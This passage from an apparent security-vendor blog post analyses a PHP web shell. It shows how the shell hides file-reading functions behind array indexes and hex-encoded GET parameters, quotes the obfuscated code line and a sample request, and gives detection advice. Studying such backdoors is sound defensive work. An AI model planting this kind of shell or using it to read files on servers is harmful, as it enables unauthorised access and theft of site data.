</pre><p>This allows the attacker to use the variable’s name, <b>$GNJ</b>, along with the order that it appears within the array in brackets.</p><p>The PHP function assigned to the array position 15 is <b>htmlspecialchars</b> and <b>file_get_contents</b> is assigned array position 6, allowing the attacker to use the variable array in place of the PHP function and obfuscate its usage:</p><pre style="color: #d1d1d1; background: #000000;">$GNJ<span style="color: #d2cd86;">[</span><span style="color: #008c00;">15</span><span style="color: #d2cd86;">]</span><span style="color: #d2cd86;">(</span>$GNJ<span style="color: #d2cd86;">[</span><span style="color: #008c00;">6</span><span style="color: #d2cd86;">]</span><span style="color: #d2cd86;">(</span>uhex<span style="color: #d2cd86;">(</span>$_GET<span style="color: #d2cd86;">[</span><span style="color: #02d045;">"</span><span style="color: #00c4c4;">s</span><span style="color: #02d045;">"</span><span style="color: #d2cd86;">]</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">)</span> 
&#x2b07;&#xfe0f;
htmlspecialchars<span style="color: #d2cd86;">(</span>file_get_contents<span style="color: #d2cd86;">(</span><span style="color: #d2cd86;">(</span>uhex<span style="color: #d2cd86;">(</span>$_GET<span style="color: #d2cd86;">[</span><span style="color: #02d045;">"</span><span style="color: #00c4c4;">s</span><span style="color: #02d045;">"</span><span style="color: #d2cd86;">]</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">)</span>
</pre><p>Finally, to  allow the bad actor to view file contents from the shell, the attacker’s browser submits a <b>GET </b>request with “<b>d</b>” and “<b>s</b>” parameters containing the hexadecimal format for the directory name and file name, respectively:</p><pre style="white-space: pre-wrap; color: #d1d1d1; background: #000000;">marijuana<span style="color: #d2cd86;">.</span>php<span style="color: #b060b0;">?</span>d<span style="color: #d2cd86;">=</span>2f7661722f7777772f68746d6c2f776f72647072657373<span style="color: #d2cd86;">&amp;</span>s<span style="color: #d2cd86;">=</span>696e6465782e706870
</pre><p>To identify this type of malicious behavior, one option is to use a tool like <a href="https://www.asciitohex.com/">asciitohex</a> to quickly convert the hexadecimal values above, helping you to determine that the request is trying to view the file <b>index.php</b> from within the directory <b>/var/www/html/wordpress/</b>. Another option is to use our <a href="https://sucuri.net/website-firewall/">web application firewall</a>, which detects and blocks these types of requests from ever reaching your website.</p><p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-27413" src="https://blog.sucuri.net/wp-content/uploads/2020/12/marijuana_shell.gif" alt="Mariajuana shell behavior" width="800" height="644" /></p><p>All of these incoming obfuscated hexidecimal requests are supposed to make it more difficult for WAFs to detect the traffic as malicious and block it.</p><p>This functionality ultimately results in a PHP shell that can be loaded in the browser and used to perform general file manager functions (upload, change permissions, view files, etc).</p><p>Since PHP shells typically operate as backdoors, they shouldn’t load or disrupt your website and you would likely be unaware of their existence until you start seeing signs of a compromised website.
